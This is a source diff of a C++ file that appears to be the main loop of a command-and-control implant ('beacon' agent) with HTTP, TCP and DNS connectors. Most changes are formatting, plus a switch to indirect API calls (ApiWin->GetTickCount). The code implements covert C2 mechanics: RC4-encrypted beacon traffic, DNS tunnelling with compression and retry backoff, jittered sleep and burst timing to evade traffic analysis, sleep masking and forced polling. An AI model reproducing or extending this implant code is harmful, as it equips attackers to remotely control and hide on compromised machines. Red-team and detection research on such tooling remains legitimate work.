@@ -5,10 +5,6 @@
 #include "Crypt.h"
 #include "WaitMask.h"
 
-#if defined(BEACON_DNS)
-#include "DnsCodec.h"
-#endif
-
 Agent* g_Agent;
 
 #if defined(BEACON_HTTP) 
@@ -99,13 +95,13 @@ void AgentMain()
 
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
-
+	
 	Packer* packerOut = new Packer();
 	packerOut->Pack32(0);
 
 	do {
 		g_Connector->Listen();
-
+		
 		g_Connector->SendData(beat, beatSize);
 
 		while ( g_Connector->RecvSize() >= 0 && g_Agent->IsActive() ) {
@@ -164,7 +160,7 @@ void AgentMain()
 
 
 
-#elif defined(BEACON_TCP)
+#elif defined(BEACON_TCP) 
 
 #include "ConnectorTCP.h"
 ConnectorTCP* g_Connector;
@@ -242,6 +238,8 @@ void AgentMain()
 	AgentClear(g_Agent->config->exit_method);
 }
 
+
+
 #elif defined(BEACON_DNS)
 
 #include "ConnectorDNS.h"
@@ -274,7 +272,7 @@ void AgentMain()
 
 	do {
 		if (pendingUpload && pendingUploadSize) {
-			ULONG now = GetTickCount();
+			ULONG now = ApiWin->GetTickCount();
 			if (now >= nextUploadAttemptTick) {
 				g_Connector->SendData(pendingUpload, pendingUploadSize);
 				if (g_Connector->WasLastQueryOk()) {
@@ -283,17 +281,20 @@ void AgentMain()
 					pendingUploadSize = 0;
 					uploadBackoffMs = 0;
 					nextUploadAttemptTick = 0;
-				} else {
+				}
+				else {
 					ULONG base = uploadBackoffMs ? uploadBackoffMs : 500;
 					ULONG next = base * 2;
 					if (next > 30000) next = 30000;
 					uploadBackoffMs = next;
-					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
+					nextUploadAttemptTick = ApiWin->GetTickCount() + uploadBackoffMs + (ApiWin->GetTickCount() & 0x3FF);
 				}
-			} else {
+			}
+			else {
 				g_Connector->SendData(NULL, 0);
 			}
-		} else if (packerOut->datasize() > 4) {
+		}
+		else if (packerOut->datasize() > 4) {
 			packerOut->Set32(0, packerOut->datasize());
 			BYTE* plainBuf = packerOut->data();
 			ULONG plainLen = packerOut->datasize();
@@ -301,18 +302,18 @@ void AgentMain()
 			BYTE* sessionBuf = NULL;
 			ULONG sessionLen = 0;
 
-			BYTE* payload    = plainBuf;
+			BYTE* payload = plainBuf;
 			ULONG payloadLen = plainLen;
-			BYTE  flags      = 0;
+			BYTE  flags = 0;
 
 			const ULONG minCompressSize = 512; // Lower threshold for DNS - every byte matters
 			if (payloadLen > minCompressSize) {
 				BYTE* compBuf = NULL;
 				ULONG compLen = 0;
 				if (DnsCodec::Compress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
-					payload    = compBuf;
+					payload = compBuf;
 					payloadLen = compLen;
-					flags      = 1;
+					flags = 1;
 				}
 			}
 
@@ -334,7 +335,8 @@ void AgentMain()
 				sendBuf = plainBuf;
 				sendLen = plainLen;
 				g_Connector->SendData(sendBuf, sendLen);
-			} else {
+			}
+			else {
 				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
 				sendBuf = sessionBuf;
 				sendLen = sessionLen;
@@ -346,20 +348,19 @@ void AgentMain()
 					memcpy(pendingUpload, sendBuf, sendLen);
 					pendingUploadSize = sendLen;
 					uploadBackoffMs = uploadBackoffMs ? uploadBackoffMs : 500;
-					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
+					nextUploadAttemptTick = ApiWin->GetTickCount() + uploadBackoffMs + (ApiWin->GetTickCount() & 0x3FF);
 				}
 			}
-			if (sessionBuf) {
+			if (sessionBuf)
 				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
-			}
 
-			if (flags & 0x1 && payload && payload != plainBuf) {
+			if (flags & 0x1 && payload && payload != plainBuf)
 				MemFreeLocal((LPVOID*)&payload, payloadLen);
-			}
 
 			packerOut->Clear(TRUE);
 			packerOut->Pack32(0);
-		} else {
+		}
+		else {
 			g_Connector->SendData(NULL, 0);
 		}
 
@@ -371,71 +372,66 @@ void AgentMain()
 
 		{
 			BYTE* dnsResolvers = g_Agent->config->profile.resolvers;
-			if (dnsResolvers && dnsResolvers != (BYTE*)g_Connector->GetResolvers()) {
+			if (dnsResolvers && dnsResolvers != (BYTE*)g_Connector->GetResolvers())
 				g_Connector->UpdateResolvers(dnsResolvers);
-			}
 		}
 
 		// Sync sleep_delay and burst config with connector
 		g_Connector->UpdateSleepDelay(g_Agent->config->sleep_delay);
-		g_Connector->UpdateBurstConfig(
-			g_Agent->config->profile.burst_enabled,
-			g_Agent->config->profile.burst_sleep,
-			g_Agent->config->profile.burst_jitter
-		);
+		g_Connector->UpdateBurstConfig(g_Agent->config->profile.burst_enabled, g_Agent->config->profile.burst_sleep, g_Agent->config->profile.burst_jitter );
 
 		// Periodically force a poll even if cached heartbeat indicates "no tasks"
 		{
-			ULONG now = GetTickCount();
-			if (nextForcePollTick == 0) {
+			ULONG now = ApiWin->GetTickCount();
+			if (nextForcePollTick == 0)
 				nextForcePollTick = now + 1500 + (now & 0x3FF);
-			}
 			BOOL idle = (packerOut->datasize() < 8) && !g_Connector->IsBusy() && (pendingUpload == NULL);
-			
-		if (idle && now >= nextForcePollTick) {
-			ULONG baseSleep = g_Agent->config->sleep_delay;
-			ULONG interval = baseSleep * 3000;  // 3x sleep_delay to avoid triggering every iteration
-			if (interval < 6000) interval = 6000;
-			if (interval > 60000) interval = 60000;
-			interval += (now & 0x3FF);
-			nextForcePollTick = now + interval;
 
-			// Only trigger if previous forcePoll was already used
-			if (!g_Connector->IsForcePollPending()) {
-				g_Connector->ForcePollOnce();
+			if (idle && now >= nextForcePollTick) {
+				ULONG baseSleep = g_Agent->config->sleep_delay;
+				ULONG interval = baseSleep * 3000;  // 3x sleep_delay to avoid triggering every iteration
+				if (interval < 6000) interval = 6000;
+				if (interval > 60000) interval = 60000;
+				interval += (now & 0x3FF);
+				nextForcePollTick = now + interval;
+
+				// Only trigger if previous forcePoll was already used
+				if (!g_Connector->IsForcePollPending())
+					g_Connector->ForcePollOnce();
 			}
-		}
 		}
 
 		if (g_Agent->IsActive()) {
 			ULONG baseSleep = g_Agent->config->sleep_delay;
 			ULONG jitter    = g_Agent->config->jitter_delay;
 
-			BOOL isBusy = g_Connector->IsBusy();
-			ULONG lastUp = g_Connector->GetLastUpTotal();
+			BOOL  isBusy   = g_Connector->IsBusy();
+			ULONG lastUp   = g_Connector->GetLastUpTotal();
 			ULONG lastDown = g_Connector->GetLastDownTotal();
-			BOOL hasData = (packerOut->datasize() >= 8);
+			BOOL  hasData  = (packerOut->datasize() >= 8);
 
 			BOOL burst = FALSE;
-			if (isBusy || (lastUp >= (1 * 1024)) || (lastDown >= (1 * 1024)) || hasData) {
+			if (isBusy || (lastUp >= (1 * 1024)) || (lastDown >= (1 * 1024)) || hasData)
 				burst = TRUE;
-			}
-
+			
 			if (burst && g_Agent->config->profile.burst_enabled) {
 				// Burst ON + active transfer: use burst_sleep
 				ULONG burstMs = g_Agent->config->profile.burst_sleep;
 				ULONG burstJitter = g_Agent->config->profile.burst_jitter;
-				if (burstMs == 0) burstMs = 50;
+				if (burstMs == 0) 
+					burstMs = 50;
 
 				if (burstJitter > 0 && burstJitter <= 90) {
 					ULONG jitterRange = (burstMs * burstJitter) / 100;
-					ULONG jitterDelta = GetTickCount() % (jitterRange + 1);
+					ULONG jitterDelta = ApiWin->GetTickCount() % (jitterRange + 1);
 					burstMs = burstMs - (jitterRange / 2) + jitterDelta;
-					if (burstMs < 10) burstMs = 10;
+					if (burstMs < 10) 
+						burstMs = 10;
 				}
 				mySleep(burstMs);
 				g_Connector->ResetTrafficTotals();
-			} else {
+			}
+			else {
 				// Burst OFF or idle: always use sleep_delay
 				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
 				if (burst) {
@@ -467,7 +463,6 @@ void AgentMain()
 	g_Connector->CloseConnector();
 	AgentClear(g_Agent->config->exit_method);
 }
-
 #endif
 
 void AgentClear(int method)
